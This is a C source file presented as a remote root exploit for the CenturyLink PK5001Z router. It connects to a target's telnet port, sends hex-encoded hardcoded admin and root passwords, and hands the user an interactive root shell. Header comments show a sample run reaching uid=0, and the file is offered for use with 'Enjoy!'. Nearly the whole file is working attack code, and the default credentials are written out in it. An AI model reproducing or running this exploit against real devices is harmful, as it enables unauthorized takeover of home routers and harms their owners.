/*  PK5001Z CenturyLink Router/Modem remote root exploit                  */
/*             oxagast / Marshall Whittaker                               */
/* marshall@likon:[~/Code/pk5001zpwn]: gcc pk5001z00pin.c -o pk5001z00pin */
/* marshall@likon:[~/Code/pk5001zpwn]: ./pk5001z00pin                     */
/* PK5001Z CenturyLink Router remote root 0day                            */
/* Enjoy!                                                                 */
/*   --oxagast                                                            */
/* marshall@likon:[~/Code/pk5001zpwn]: ./pk5001z00pin 192.168.0.1         */
/*                                                                        */
/* # uname -a; id;                                                        */
/* Linux PK5001Z 2.6.20.19 #54 Wed Oct 14 11:17:48 CST 2015 mips unknown  */
/* uid=0(root) gid=0(root)                                                */
/* #                                                                      */
/*                                                                        */

#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <netdb.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

#include <signal.h>

#define END_STRING "chau\n"
#define COMPLETE_STRING "fin-respuesta"

#ifndef MSG_NOSIGNAL
#define MSG_NOSIGNAL SO_NOSIGPIPE
#endif

#define perro(x)                                                               \
  {                                                                            \
    fprintf(stderr, "%s:%d: %s: %s\n", __FILE__, __LINE__, x,                  \
            strerror(errno));                                                  \
    exit(1);                                                                   \
  }

void send_root(int sock, int pid) {
  char buf[1024] = {0};
  char getal[1024] = "\x61\x64\x6d\x69\x6e\x0a";
  char getap[1024] = "\x43\x65\x6e\x74\x75\x72\x79\x4c\x31\x6e\x6b\x0a";
  char getrl[1024] = "\x73\x75\x20\x72\x6f\x6f\x74\x0a";
  char getrp[1024] = "\x7a\x79\x61\x64\x35\x30\x30\x31";
  recv(sock, buf, 1024 - 1, 0);
  sleep(1);
  if (strncmp(getal, END_STRING, strlen(END_STRING)) == 0)
    ;
  if (send(sock, getal, strlen(getal) + 1, 0) < 0)
    perro("send");
  recv(sock, buf, 1024 - 1, 0);
  sleep(1);
  if (strncmp(getap, END_STRING, strlen(END_STRING)) == 0)
    ;
  if (send(sock, getap, strlen(getap) + 1, 0) < 0)
    perro("send");
  sleep(2);
  recv(sock, buf, 1024 - 1, 0);
  if (strncmp(getrl, END_STRING, strlen(END_STRING)) == 0)
    ;
  if (send(sock, getrl, strlen(getrl) + 1, 0) < 0)
    perro("send");
  sleep(2);
  recv(sock, buf, 1024 - 1, 0);
  if (strncmp(getrp, END_STRING, strlen(END_STRING)) == 0)
    ;
  if (send(sock, getrp, strlen(getrp) + 1, 0) < 0)
    perro("send");
  sleep(2);
}

void send_cmd(int sock, int pid) {
  char str[1024] = {0};

  while (fgets(str, 1024, stdin) == str) {
    if (strncmp(str, END_STRING, strlen(END_STRING)) == 0)
      break;
    if (send(sock, str, strlen(str) + 1, 0) < 0)
      perro("send");
  }
  kill(pid, SIGKILL);
}

void sys_info(int sock, int pid) {
  char buf[1024] = {0};
  char sysinfo[1024] = "\nuname -a; id;\n";
  if (strncmp(sysinfo, END_STRING, strlen(END_STRING)) == 0)
    ;
  if (send(sock, sysinfo, strlen(sysinfo) + 1, 0) < 0)
    perro("send");
  sleep(1);
  int filled = 0;
  while (filled = recv(sock, buf, 1024 - 1, 0)) {
    buf[filled] = '\0';
    printf("%s", buf);
    fflush(stdout);
  }
  kill(pid, SIGKILL);
}

void receive(int sock) {
  char buf[1024] = {0};
  int filled = 0;
  while (filled = recv(sock, buf, 1024 - 1, 0)) {
    buf[filled] = '\0';
    printf("%s", buf);
    fflush(stdout);
  }
}

int main(int argc, char **argv) {
  if (argc != 2) {
    printf("PK5001Z CenturyLink Router remote root 0day\nEnjoy!\n");
    printf("   --oxagast\n");
    exit(1);
  }
  int sock = socket(AF_INET, SOCK_STREAM, 0);
  if (sock == -1)
    perro("socket");
  struct in_addr server_addr;
  if (!inet_aton(argv[1], &server_addr))
    perro("inet_aton");
  struct sockaddr_in connection;
  connection.sin_family = AF_INET;
  memcpy(&connection.sin_addr, &server_addr, sizeof(server_addr));
  connection.sin_port = htons(23);
  if (connect(sock, (const struct sockaddr *)&connection, sizeof(connection)) !=
      0)
    perro("connect");
  sleep(1);
  int pid_root, pid_sys, pid_shell;
  sleep(1);
  send_root(sock, pid_root);
  if (pid_shell = fork())
    sys_info(sock, pid_sys);
  if (pid_shell = fork())
    send_cmd(sock, pid_shell);
  else
    receive(sock);
  return (0);
}